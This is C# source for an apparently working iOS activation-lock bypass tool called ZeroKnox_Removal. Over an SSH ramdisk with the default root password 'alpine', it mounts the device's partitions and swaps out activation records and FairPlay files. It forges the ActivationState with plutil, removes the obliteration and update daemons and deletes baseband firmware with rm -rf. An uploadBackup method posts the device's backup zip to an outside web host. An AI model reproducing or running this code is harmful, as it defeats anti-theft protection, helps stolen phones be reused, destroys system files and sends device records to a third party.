using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Renci.SshNet;
using ZeroKnox_Removal;

namespace ZeroKnox_Removal
{
    internal class Passcode
    {
        public void PasscodeExtractBackup()
        {
            string ecid = iOSDevice.ECID;
            string path = ".\\Backups\\" + ecid;
            this.p(5, "[+] Checking SSH..");
            this.RunSSHServer();
            this.SSH("mount_filesystems");
            this.SSH("mount.sh");
            this.SSH("mount_party -o rw,union,update /");
            try
            {
                this.SSH("/sbin/mount_apfs /dev/disk0s1s1 /mnt1");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s3 /mnt7");
                this.SSH("/usr/libexec/seputil --gigalocker-init");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s6 /mnt6");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s5 /mnt5");
                this.SSH("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s2 /mnt2");
                bool flag = !File.Exists(path);
                if (flag)
                {
                    Directory.CreateDirectory(path);
                }
                bool flag2 = File.Exists(".\\Backups\\" + ecid + ".zip");
                if (flag2)
                {
                    MessageBox.Show("Sorry, Backup Already Exist In Folder ./Backups ;)", "Backup Exist", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    this.p(20, "[-] Backup Already Exist..");
                }
                else
                {
                    Directory.CreateDirectory(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\FairPlay\\");
                    string text = this.Exec("find /mnt2/containers/Data/System -name activation_record.plist");
                    string text2 = this.Exec("find /mnt2/containers/Data/System -name data_ark.plist");
                    string str = this.Exec("find /mnt2/containers/Data/System -name 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
                    this.p(30, "[+] Download Activation Records..");
                    try
                    {
                        this.scpClient.Download(str + "Library/activation_records/activation_record.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\1"));
                        this.scpClient.Download("/mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\3"));
                        this.scpClient.Download(str + "Library/internal/data_ark.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\2"));
                    }
                    catch
                    {
                        this.SSH("chmod -R 777 " + text);
                        this.SSH("chmod -R 777 " + text2);
                        this.scpClient.Download(text, new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\1"));
                        this.scpClient.Download(text2, new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\2"));
                        this.scpClient.Download("/mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\3"));
                    }
                    this.downloadFairplay();
                    this.p(60, "[+] Saving Activations Records..");
                    Directory.CreateDirectory(Environment.CurrentDirectory + "\\Backups\\" + ecid);
                    string sourceDirectoryName = Environment.CurrentDirectory + "\\Backups\\" + ecid;
                    string text3 = Environment.CurrentDirectory + "\\Backups\\" + ecid + ".zip";
                    System.IO.Compression.ZipFile.CreateFromDirectory(sourceDirectoryName, text3);
                    bool flag3 = Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + ecid);
                    if (flag3)
                    {
                        Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + ecid, true);
                    }
                    this.p(80, "[+] Saving backup...");
                    //Antihack antihack = new Antihack();
                    MessageBox.Show("\niDevice Backup Successfully..");
                    this.p(100, "[+] Backup Successfully!! | Device reboot in 5 Seconds");
                    DialogResult dialogResult = MessageBox.Show("Your Backup Has Been Successfully saved \n" + text3 + iOSDevice.ECID + ".zip \nErase device Now ??", "Backup Successfully !!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                    bool flag4 = dialogResult == DialogResult.Yes;
                    if (flag4)
                    {
                        this.SSH("/usr/sbin/nvram oblit-inprogress=5");
                        this.SSH("/sbin/reboot");
                        MessageBox.Show("Erase successfully in Next Boot !!", "Zero Security", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                    else
                    {
                        this.SSH("/sbin/reboot");
                    }
                }
            }
            catch (Exception ex)
            {
                bool flag5 = ex.Message.ToLowerInvariant().Contains("filename");
                if (flag5)
                {
                    MessageBox.Show("Filename Not Found in your device !! \n Maybe your device in Hello Mode !!!\n Or filesystems not mounted !!", "ZeroPro Ram Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    MessageBox.Show(ex.Message, "ZeroPro Ram Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
        }
        public void Mount2()
        {
            try
            {
                this.RunSSHServer();
                this.SSH("mount_party");
                this.SSH("mount.sh");
                this.SSH("mount_filesystems");
                this.SSH("/sbin/mount_apfs -R /dev/disk0s1s1 /mnt1");
                this.SSH("/sbin/mount_apfs -R /dev/disk0s1s5 /mnt5");
                this.SSH("/sbin/mount_apfs -R /dev/disk0s1s6 /mnt6");
                this.SSH("/sbin/mount_apfs -R /dev/disk0s1s3 /mnt7");
                this.SSH("/usr/libexec/seputil --gigalocker-init");
                this.SSH("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
                this.SSH("/sbin/mount_apfs -R /dev/disk0s1s2 /mnt2");
            }
            catch
            {
            }
        }

        public void Mount3()
        {
            try
            {
                this.RunSSHServer();
                this.SSH("mount_party");
                this.SSH("mount.sh");
                this.SSH("mount_filesystems");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s3 /mnt7");
                this.SSH("/usr/libexec/seputil --gigalocker-init");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s6 /mnt6");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s5 /mnt5");
                this.SSH("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
                this.SSH("/sbin/mount_apfs /dev/disk0s1s2 /mnt2");
            }
            catch
            {
            }
        }

        public bool PasscodeActivate()
        {
            this.RunSSHServer();
            this.SSH("mount_filesystems");
            this.SSH("mount.sh");
            this.SSH("/sbin/mount_apfs /dev/disk0s1s1 /mnt1");
            this.SSH("/sbin/mount_apfs /dev/disk0s1s3 /mnt7");
            this.SSH("/usr/libexec/seputil --gigalocker-init");
            this.SSH("/sbin/mount_apfs /dev/disk0s1s6 /mnt6");
            this.SSH("/sbin/mount_apfs /dev/disk0s1s5 /mnt5");
            this.SSH("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
            this.SSH("/sbin/mount_apfs /dev/disk0s1s2 /mnt2");
            string ecid = iOSDevice.ECID;
            string path = ".\\Backups\\";
            string path2 = ".\\Backups\\" + ecid + ".zip";
            bool isConnected = this.scpClient.IsConnected;
            bool flag = !File.Exists(path2);
            if (flag)
            {
                Directory.CreateDirectory(path);
            }
            bool flag7;
            try
            {
                bool flag2 = !this.scpClient.IsConnected;
                if (flag2)
                {
                    this.scpClient.Connect();
                }
                bool flag3 = Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + ecid);
                bool flag4 = flag3;
                if (flag4)
                {
                    Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + ecid, true);
                }
                string sourceArchiveFileName = Environment.CurrentDirectory + "\\Backups\\" + ecid + ".zip";
                string text = Environment.CurrentDirectory + "\\Backups\\" + ecid;
                System.IO.Compression.ZipFile.ExtractToDirectory(sourceArchiveFileName, text);
                File.Copy(Environment.CurrentDirectory + "\\ref\\files\\com.apple.purplebuddy.plist", text + "\\com.apple.purplebuddy.plist");
                this.p(20, "[+] Checking Backup...");
                string text2 = this.Exec("find /mnt2/containers/Data/System -iname 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
                this.Exec("rm -rf /mnt2/mobile/Media/Downloads/" + ecid);
                this.Exec("rm -rf /mnt2/mobile/Media/" + ecid);
                this.p(30, "[+] Uploading Backup Via Scp");
                this.Exec("mkdir /mnt2/mobile/Media/Downloads/" + ecid);
                this.scpClient.Upload(new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid), "/mnt2/mobile/Media/Downloads/" + ecid);
                this.Exec("mv -f /mnt2/mobile/Media/Downloads/" + ecid + " /mnt2/mobile/Media/" + ecid);
                this.Exec("chown -R mobile:mobile /mnt2/mobile/Media/" + ecid);
                this.p(40, "[+] Preparing Device...");
                this.Exec("chmod -R 755 /mnt2/mobile/Media/" + ecid);
                this.Exec("chmod 644 /mnt2/mobile/Media/" + ecid + "/1");
                this.Exec("chmod 644 /mnt2/mobile/Media/" + ecid + "/2");
                this.Exec("chmod 644 /mnt2/mobile/Media/" + ecid + "/3");
                Thread.Sleep(4000);
                string text3 = this.Exec("find /mnt2/containers/Data/System -name activation_record.plist");
                string text4 = this.Exec("find /mnt2/containers/Data/System -name data_ark.plist");
                this.p(50, "[+] IC-Info.sisv...");
                this.Exec("rm -rf /mnt2/mobile/Library/FairPlay");
                this.Exec("mv -f /mnt2/mobile/Media/" + ecid + "/FairPlay /mnt2/mobile/Library/");
                this.Exec("chmod -R 755 /mnt2/mobile/Library/FairPlay/");
                this.Exec("chown -R mobile:mobile /mnt2/mobile/Library/FairPlay");
                this.Exec("chmod 664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
                this.Exec("chflags nouchg " + text2 + "/Library /internal/data_ark.plist");
                this.p(50, "[+] Checking Device...");
                this.Exec(string.Concat(new string[]
                {
                    "mv -f /mnt2/mobile/Media/",
                    ecid,
                    "/2 ",
                    text2,
                    "/Library/internal/data_ark.plist"
                }));
                this.Exec("chmod 755 " + text2 + "/Library/internal/data_ark.plist");
                this.Exec("chflags uchg " + text2 + "/Library/internal/data_ark.plist");
                this.Exec("mkdir " + text2 + "/Library/activation_records");
                this.Exec(string.Concat(new string[]
                {
                    "mv -f /mnt2/mobile/Media/",
                    ecid,
                    "/1 ",
                    text2,
                    "/Library/activation_records/activation_record.plist"
                }));
                this.Exec("chmod 755 " + text2 + "/Library/activation_records/activation_record.plist");
                this.Exec("chmod 777 " + text2 + "/Library/activation_records/activation_record.plist");
                this.Exec("chflags uchg " + text2 + "/Library/activation_records/activation_record.plist");
                this.Exec("chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("mv -f /mnt2/mobile/Media/" + ecid + "/3 /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("chown root:mobile /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("chmod 755 /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("chflags uchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("launchctl unload /mnt2/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
                this.Exec("launchctl load /mnt2/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
                this.Exec("rm -rf /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
                this.Exec("chmod 600 mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
                this.Exec("/usr/bin/uicache --all && chflags uchg /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
                this.Exec("rm -rf /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
                this.Exec("mv -f /mnt2/mobile/Media/Downloads/info2 /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
                this.Exec("/bin/chmod 600 /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
                this.Exec("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
                this.Exec("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
                this.Exec("rm -rf /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
                this.Exec("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
                this.Exec("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist");
                this.Exec("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.OTACrachCopier.plist");
                this.Exec("/bin/launchctl unload /mnt1/System/Library/LaunchDaemons/com.apple.CommCenter.plist");
                this.p(70, "[+] Activating...");
                this.Exec("mv -f /mnt2/mobile/Media/" + ecid + "/com.apple.purplebuddy.plist /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
                MessageBox.Show("\n✅ Passcode Device Activated Sucessfully!!!");
                this.SSH("kill 1");
                bool flag5 = Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + ecid);
                bool flag6 = flag5;
                if (flag6)
                {
                    Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + ecid, true);
                }
                this.p(100, "[+] Success! Device reboot in 5 seconds");
                this.KillIproxy();
                MessageBox.Show("Your Device " + iOSDevice.Name + " Successfully Activated You Can OTA UPDATE, But Can't Restore!", "SUCCESSFULLY ACTIVATED!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                flag7 = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                flag7 = false;
            }
            return flag7;
        }

        public bool ActivateDevice()
        {
            this.RunSSHServer();
            string text = "hello_screen";
            bool flag3;
            try
            {
                this.p(10, "[+] Starting Bypass iOS 15..");
                bool flag = !this.sshClient.IsConnected;
                if (flag)
                {
                    this.sshClient.Connect();
                }
                bool flag2 = !this.scpClient.IsConnected;
                if (flag2)
                {
                    this.scpClient.Connect();
                }
                this.SSH("mount_filesystems");
                string text2 = this.Exec("find /mnt2/containers/Data/System -name 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
                this.p(20, "[+] Checking Activation Files..");
                string text3 = this.Exec("find /mnt2/containers/Data/System -iname 'internal'").Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
                this.Exec("rm -rf /mnt2/mobile/Media/Downloads/" + text);
                this.Exec("rm -rf /mnt2/mobile/Media/" + text);
                this.p(30, "[+] Uploading Activation Files..");
                this.Exec("mkdir /mnt2/mobile/Media/Downloads/" + text);
                string str = File.ReadAllText("ssl/udid.pl");
                File.Copy(Environment.CurrentDirectory + "\\ref\\files\\com.apple.purplebuddy.plist", Environment.CurrentDirectory + "\\ActivationFiles\\" + str + "\\com.apple.purplebuddy.plist");
                this.scpClient.Upload(new DirectoryInfo(Environment.CurrentDirectory + ".\\ActivationFiles\\" + str + "\\"), "/mnt2/mobile/Media/Downloads/hello_screen/");
                this.Exec("mv -f /mnt2/mobile/Media/Downloads/" + text + " /mnt2/mobile/Media/" + text);
                this.Exec("chown -R mobile:mobile /mnt2/mobile/Media/" + text);
                this.p(40, "[+] Preparing Device..");
                this.Exec("chmod -R 755 /mnt2/mobile/Media/" + text);
                this.Exec("chmod 644 /mnt2/mobile/Media/" + text + "/activation_record.plist");
                this.Exec("chmod 644 /mnt2/mobile/Media/" + text + "/Wildcard.der");
                Thread.Sleep(4000);
                this.p(50, "[+] Creating Info-sisv Files..");
                this.Exec("rm -rf /mnt2/mobile/Library/FairPlay");
                this.Exec("mkdir -p -m 00755 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes");
                this.Exec("mv -f /mnt2/mobile/Media/hello_screen/IC-Info.sisv /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/");
                this.Exec("chmod 00664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
                this.Exec("chown -R mobile:mobile /mnt2/mobile/Library/FairPlay");
                this.p(70, "[+] Creating Activation Files...");
                this.Exec("rm -rf " + text3 + "/Library/activation_records");
                this.Exec("mkdir " + text3 + "/Library/activation_records");
                this.Exec("chflags nouchg " + text3 + "/Library/activation_records");
                this.Exec(string.Concat(new string[]
                {
                    "mv -f /mnt2/mobile/Media/",
                    text,
                    "/activation_record.plist ",
                    text3,
                    "/Library/activation_records/activation_record.plist"
                }));
                this.Exec("mv -f /mnt2/mobile/Media/" + text + "/com.apple.purplebuddy.plist /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
                this.Exec("chmod 755 " + text3 + "/Library/activation_records/activation_record.plist");
                this.Exec("chmod 777 " + text3 + "/Library/activation_records/activation_record.plist");
                this.p(80, "[+] Injecting Activation Files..");
                this.Exec("chflags uchg " + text3 + "/Library/activation_records/activation_record.plist");
                this.Exec("chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("chflags nouchg " + text3 + "/Library /internal/data_ark.plist");
                this.Exec("plutil -dict -kPostponementTicket /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("plutil -kPostponementTicket -ActivationState -string Activated /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("plutil -kPostponementTicket -ActivityURL -string https://albert.apple.com/deviceservices/activity /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("plutil -kPostponementTicket -PhoneNumberNotificationURL -string https://albert.apple.com/deviceservices/phoneHome /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("plutil -kPostponementTicket -ActivationTicket -string '$(cat /mnt2/mobile/Media/" + text + "/Wildcard.der)' /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BuildVersion' -string $build $key");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - LastActivated' -string $build $key");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - ActivationState' -remove $key");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BrickState' -remove $key");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - ActivationState' -string Activated $key");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BrickState' -0 -false $key");
                this.Exec("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); plutil -binary $key");
                this.Exec("chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
                this.Exec("chflags uchg " + text3 + "/Library /internal/data_ark.plist");
                this.p(90, "[+] Delete baseband Data !!!");
                this.SSH("chflags -R nouchg /mnt6/*/usr/local/standalone/firmware/");
                this.SSH("rm -rf /mnt6/*/usr/local/standalone/firmware/Baseband");
                this.SSH("kill 1");
                MessageBox.Show("\nHello Device Successfully Activated !!");
                this.p(100, "Your Device Succesfully Activated!");
                this.KillIproxy();
                MessageBox.Show("Your Device " + iOSDevice.Name + " Successfully Activated!\n", "Zero Security", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                flag3 = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Zero Security", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                flag3 = false;
            }
            return flag3;
        }

        public void KillIproxy()
        {
            Process[] processesByName = Process.GetProcessesByName("iproxy");
            for (int i = 0; i < processesByName.Length; i++)
            {
                processesByName[i].Kill();
            }
            bool flag = File.Exists("%USERPROFILE%\\.ssh\\known_hosts");
            if (flag)
            {
                File.Delete("%USERPROFILE%\\.ssh\\known_hosts");
            }
        }

        private void downloadFairplay()
        {
            try
            {
                string ecid = iOSDevice.ECID;
                this.SSH("chmod -R 777 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
                this.SSH("chmod -R 777 /mnt2/mobile/Library/FairPlay");
                this.scpClient.Download("/mnt2/mobile/Library/FairPlay", new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\FairPlay\\"));
                this.SSH("chmod 755 /mnt2/mobile/Library/FairPlay/");
            }
            catch
            {
                this.downloadFairplay2();
            }
        }

        // Token: 0x060000AC RID: 172 RVA: 0x0000CBC8 File Offset: 0x0000ADC8
        private void downloadFairplay2()
        {
            try
            {
                string ecid = iOSDevice.ECID;
                this.SSH("chmod 755 /mnt2/mobile/Library/FairPlay");
                this.SSH("chmod -R 777 /mnt2/mobile/Library/FairPlay");
                this.SSH("chmod -R 777 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
                this.SSH("chmod +x /mnt2/mobile/Library/FairPlay");
                this.scpClient.Download("/mnt2/mobile/Library/FairPlay", new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + ecid + "\\FairPlay\\"));
                this.SSH("chmod 755 /mnt2/mobile/Library/FairPlay");
            }
            catch
            {
            }
        }

        internal string Exec(string command)
        {
            bool flag = !this.sshClient.IsConnected;
            if (flag)
            {
                try
                {
                    this.sshClient.Connect();
                }
                catch
                {
                    MessageBox.Show("Cannot Connect to the Device! Please Restart the App and Try Again!", "Connection to Device Lost.");
                    return "XD";
                }
            }
            SshCommand sshCommand = this.sshClient.CreateCommand(command);
            string text;
            try
            {
                sshCommand.Execute();
                text = sshCommand.Result;
            }
            catch
            {
                this.sshClient.Disconnect();
                text = "XD";
            }
            return text;
        }

        public void Mount()
        {
            this.SSH("mount -o rw,union,update /");
            this.SSH("mount_party -o rw,union,update /");
            this.SSH("mount_filesystems");
        }

        public SshCommand SSH(string command)
        {
            bool flag = !this.sshClient.IsConnected;
            if (flag)
            {
                this.sshClient.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
                this.sshClient.Connect();
            }
            SshCommand sshCommand2;
            try
            {
                SshCommand sshCommand = this.sshClient.CreateCommand(command);
                sshCommand.CommandTimeout = TimeSpan.FromSeconds(30.0);
                sshCommand.Execute();
                bool debugMode = iOSDevice.debugMode;
                if (debugMode)
                {
                    Console.WriteLine("=================");
                    Console.WriteLine("Command Name = {0} " + sshCommand.CommandText);
                    Console.WriteLine("Return Value = {0}", sshCommand.ExitStatus);
                    Console.WriteLine("Error = {0}", sshCommand.Error);
                    Console.WriteLine("Result = {0}", sshCommand.Result);
                }
                sshCommand2 = sshCommand;
            }
            catch
            {
                bool flag2 = !(command == "ls") && !(command == "uicache --all");
                if (flag2)
                {
                    bool debugMode2 = iOSDevice.debugMode;
                    if (debugMode2)
                    {
                        Console.WriteLine("SSH Error caused by: " + command);
                    }
                    else
                    {
                        Thread.Sleep(2000);
                    }
                    this.StartIproxy();
                    this.SSH(command);
                }
                sshCommand2 = null;
            }
            return sshCommand2;
        }

        public void RunSSHServer()
        {
            for (; ; )
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = Passcode.ToolDir + "\\ref\\files\\iproxy.exe";
                    process.StartInfo.Arguments = this.port.ToString() + " 22";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                }
                try
                {
                    this.ConnectSshClient();
                    break;
                }
                catch (Exception ex)
                {
                    MessageBoxButtons buttons = MessageBoxButtons.YesNo;
                    bool flag = MessageBox.Show("SSH Connection Error. Try again.", "SSH Connection Error", buttons) == DialogResult.Yes;
                    if (!flag)
                    {
                        throw new ApplicationException("Error SSH " + ex.Message);
                    }
                }
            }
        }

        public void ConnectSshClient()
        {
            AuthenticationMethod[] authenticationMethods = new AuthenticationMethod[]
            {
                new PasswordAuthenticationMethod("root", this.password)
            };
            ConnectionInfo connectionInfo = new ConnectionInfo(this.host, this.port, "root", authenticationMethods);
            connectionInfo.Timeout = TimeSpan.FromSeconds(20.0);
            this.sshClient = new SshClient(connectionInfo);
            this.scpClient = new ScpClient(connectionInfo);
            bool flag = !this.sshClient.IsConnected;
            if (flag)
            {
                this.sshClient.Connect();
            }
            bool flag2 = !this.scpClient.IsConnected;
            if (flag2)
            {
                this.scpClient.Connect();
            }
        }

        public void StartIproxy()
        {
            try
            {
                new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = Passcode.ToolDir + "\\ref\\files\\iproxy.exe",
                        Arguments = this.port.ToString() + " 44",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                }.Start();
            }
            catch (Win32Exception)
            {
                MessageBox.Show("iProxy Not Found");
            }
        }

        private void uploadBackup()
        {
            try
            {
                string ecid = iOSDevice.ECID;
                string str = Passcode.encode;
                string link_Web = Passcode.Link_Web;
                string method = "POST";
                WebClient webClient = new WebClient();
                string str2 = this.fileAddress;
                webClient.Credentials = CredentialCache.DefaultCredentials;
                webClient.UploadFile(link_Web, method, str2 + ecid + str);
                webClient.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error");
            }
        }

        public void p(int number, string message = "")
        {
            zeroknox frm1 = (zeroknox)Application.OpenForms["zeropro"];
            frm1.Invoke(new MethodInvoker(delegate ()
            {
                frm1.reportProgress(number, number.ToString());
            }));
            bool debugMode = iOSDevice.debugMode;
            if (debugMode)
            {
                Console.WriteLine(number.ToString());
            }
            
        }

        private SshClient sshClient;

        private ScpClient scpClient;

        public SshClient Ssh = new SshClient("127.0.0.1", "root", "alpine");

        public ScpClient Scp = new ScpClient("127.0.0.1", "root", "alpine");

        public string host = "127.0.0.1";

        public int port = 2222;

        public string password = "alpine";

        public static string ToolDir = Directory.GetCurrentDirectory();

        public static string encode = ".zip";

        public static string info = "\\Backups\\";

        public static string Link_Web = "http://hiacedisemarang.com/ramdisk/";

        private string fileAddress = Passcode.Dir + Passcode.info;

        public static string Dir = Directory.GetCurrentDirectory();

        public static string aldaz = Passcode.ToolDir + "\\Backups\\";

        public static string SwapPCDir = Passcode.ToolDir + "\\ref\\files\\utils\\";

        public static string deleted = Passcode.ToolDir + "\\ref\\files\\utils.zip";

        private string WildcardTicket;

        private int stage;

        private int step;

        private string result;

        public static string rutaimg4 = Passcode.ToolDir + ".\\ref\\Cache\\";






    }
}
